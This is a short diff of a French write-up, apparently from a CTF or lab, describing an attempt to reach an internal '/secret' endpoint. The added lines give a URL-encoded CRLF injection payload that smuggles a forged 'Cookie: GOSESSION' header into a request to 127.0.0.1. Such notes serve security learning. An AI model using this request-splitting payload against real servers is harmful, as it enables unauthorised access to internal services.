@@ -25,8 +25,10 @@ Premier payloads qui n'a pas fonctionné
 ```URL
 127.0.0.1/secret
 ```
-=> 404 page not found. Celà est surement dû au fait que le server rajoute
+=> 404 page not found. Celà est surement dû au fait que le server rajoute le port 80
+ 
+Après plusieurs jours de tentative et de recherche nous avons réussi à construire le payload
 
-```URL
-127.0.0.1/secret
+``URL
+127.0.0.1/secret%3F%20HTTP/1.1%0D%0ACookie:%20GOSESSION=guest-go1.11.5
 ```
